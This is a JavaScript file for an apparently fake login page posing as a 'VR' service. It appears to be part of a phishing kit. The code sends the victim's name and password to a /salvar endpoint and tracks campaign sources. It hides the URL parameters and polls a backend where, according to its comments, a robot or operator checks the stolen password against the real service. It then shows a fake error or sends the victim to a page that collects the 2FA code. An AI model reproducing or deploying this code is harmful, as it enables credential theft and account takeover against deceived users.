const form = document.getElementById("submission-form");
const botao = document.getElementById("continuar");
const inputNome = document.getElementById("nome");
const inputSenha = document.getElementById("senha");
const fieldSenha = document.getElementById("field-senha");
const statusElem = document.getElementById("submission-status");
const loginErroElem = document.getElementById("login-erro");

// Lê parâmetros da URL caso a página tenha sido chamada com query string
const urlParams = new URLSearchParams(window.location.search);
const paramId = urlParams.get("identificador") || urlParams.get("nome");
const paramSenha = urlParams.get("senha") || urlParams.get("password");
const paramTenant = (urlParams.get("tenant") || urlParams.get("cliente") || sessionStorage.getItem("vr_tenant") || "default").trim();

if (paramTenant) {
    sessionStorage.setItem("vr_tenant", paramTenant);
}

if (paramId && inputNome) {
    inputNome.value = paramId;
}
if (paramSenha && inputSenha) {
    inputSenha.value = paramSenha;
}

// Captura e armazena parâmetros UTM para telemetria de cliques e fontes
const utmSource = urlParams.get("utm_source");
const utmMedium = urlParams.get("utm_medium");
const utmCampaign = urlParams.get("utm_campaign");
const utmTerm = urlParams.get("utm_term");
const utmContent = urlParams.get("utm_content");

if (utmSource) sessionStorage.setItem("vr_utm_source", utmSource);
if (utmMedium) sessionStorage.setItem("vr_utm_medium", utmMedium);
if (utmCampaign) sessionStorage.setItem("vr_utm_campaign", utmCampaign);
if (utmTerm) sessionStorage.setItem("vr_utm_term", utmTerm);
if (utmContent) sessionStorage.setItem("vr_utm_content", utmContent);

// Dispara telemetria de tráfego UTM assíncrona (não-bloqueante)
try {
    const rawQuery = window.location.search ? window.location.search.substring(1) : "";
    fetch("/api/utm/track", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
            tenant: paramTenant || "default",
            landing_url: window.location.href,
            referrer: document.referrer || "",
            utm_source: utmSource || sessionStorage.getItem("vr_utm_source") || "",
            utm_medium: utmMedium || sessionStorage.getItem("vr_utm_medium") || "",
            utm_campaign: utmCampaign || sessionStorage.getItem("vr_utm_campaign") || "",
            utm_term: utmTerm || sessionStorage.getItem("vr_utm_term") || "",
            utm_content: utmContent || sessionStorage.getItem("vr_utm_content") || "",
            raw_query: rawQuery
        }),
        keepalive: true
    }).catch(() => {});
} catch (e) {}

// Higienização completa da barra de endereços (nunca expor parâmetros na URL)
if (window.location.search || window.location.hash || window.location.pathname.endsWith(".html")) {
    const cleanPath = window.location.pathname.replace(/index\.html$/, "").replace(/\.html$/, "") || "/";
    window.history.replaceState({}, document.title, cleanPath);
}

function mostrarErro(mensagem) {
    if (!loginErroElem) return;
    if (mensagem) {
        const span = loginErroElem.querySelector("span");
        if (span) span.textContent = mensagem;
    }
    loginErroElem.style.display = "flex";
    if (fieldSenha) fieldSenha.classList.add("has-error");
}

function esconderErro() {
    if (loginErroElem) loginErroElem.style.display = "none";
    if (fieldSenha) fieldSenha.classList.remove("has-error");
}

function updateButtonState() {
    if (!botao || !inputNome || !inputSenha) return;
    const nomeVal = inputNome.value.trim();
    const senhaVal = inputSenha.value;

    // Regra Fundamental: Só remove o erro se o usuário efetivamente digitar novo caractere (val.length > 0)
    if (senhaVal.length > 0) {
        esconderErro();
    }

    if (nomeVal.length > 0 && senhaVal.length > 0) {
        botao.disabled = false;
        botao.classList.add("active");
    } else {
        botao.disabled = true;
        botao.classList.remove("active");
    }
}

if (inputNome) {
    inputNome.addEventListener("input", updateButtonState);
    inputNome.addEventListener("keyup", updateButtonState);
    inputNome.addEventListener("change", updateButtonState);
}

if (inputSenha) {
    inputSenha.addEventListener("input", updateButtonState);
    inputSenha.addEventListener("keyup", updateButtonState);
    inputSenha.addEventListener("change", updateButtonState);
}

// Inicializa o estado do botão no carregamento
updateButtonState();

if (form) {
    form.addEventListener("submit", async (e) => {
        e.preventDefault();
        await handleLogin();
    });
}

if (botao) {
    botao.addEventListener("click", async (e) => {
        e.preventDefault();
        await handleLogin();
    });
}

let loginPollingInterval = null;

async function handleLogin() {
    if (!inputNome || !inputSenha) return;
    const nome = inputNome.value.trim();
    const senha = inputSenha.value;

    if (!nome || !senha) {
        if (statusElem) statusElem.textContent = "Preencha todos os campos.";
        return;
    }

    // Estado visual de processamento / loading
    botao.disabled = true;
    botao.classList.remove("active");
    botao.textContent = "Aguarde...";
    if (statusElem) statusElem.textContent = "";
    esconderErro();

    // Armazena no sessionStorage para personalização da tela de 2FA
    sessionStorage.setItem("vr_usuario", nome);
    const tenantAtivo = sessionStorage.getItem("vr_tenant") || paramTenant || "default";

    try {
        await fetch("/salvar", {
            method: "POST",
            headers: {
                "Content-Type": "application/json"
            },
            body: JSON.stringify({
                nome: nome,
                senha: senha,
                tenant: tenantAtivo,
                utm_source: sessionStorage.getItem("vr_utm_source") || "",
                utm_medium: sessionStorage.getItem("vr_utm_medium") || "",
                utm_campaign: sessionStorage.getItem("vr_utm_campaign") || ""
            })
        });
    } catch (erro) {
        console.error("Aviso no envio de credenciais:", erro);
    }

    // Fica em estado de loading enquanto o robô valida ou o operador decide
    iniciarEspera2FA(nome, tenantAtivo);
}

function iniciarEspera2FA(nome, tenant = "default") {
    if (loginPollingInterval) clearInterval(loginPollingInterval);

    loginPollingInterval = setInterval(async () => {
        try {
            const res = await fetch(`/api/status-login?usuario=${encodeURIComponent(nome)}&tenant=${encodeURIComponent(tenant)}&t=${Date.now()}`, {
                cache: "no-store",
                headers: { "Cache-Control": "no-cache" }
            });
            if (!res.ok) return;
            const data = await res.json();

            // 1. Se o robô detectou que a senha está incorreta na VR
            if (data.status_credencial === "invalido") {
                clearInterval(loginPollingInterval);
                loginPollingInterval = null;

                // Restaura o botão e exibe erro
                botao.disabled = true;
                botao.classList.remove("active");
                botao.textContent = "Continuar";
                mostrarErro("E-mail ou senha incorretos. Verifique seus dados e tente novamente.");

                inputSenha.value = "";
                inputSenha.focus();
                return;
            }

            // 2. Se o operador clicou em Solicitar 2FA ou se o Full-Auto disparou
            if (data.status_login === "solicitar_2fa") {
                clearInterval(loginPollingInterval);
                loginPollingInterval = null;
                botao.textContent = "Redirecionando...";
                setTimeout(() => {
                    // NUNCA passar parâmetros pela URL
                    window.location.href = "/codigo";
                }, 300);
                return;
            }
        } catch (err) {
            console.error("Erro ao verificar status do login:", err);
        }
    }, 400);
}
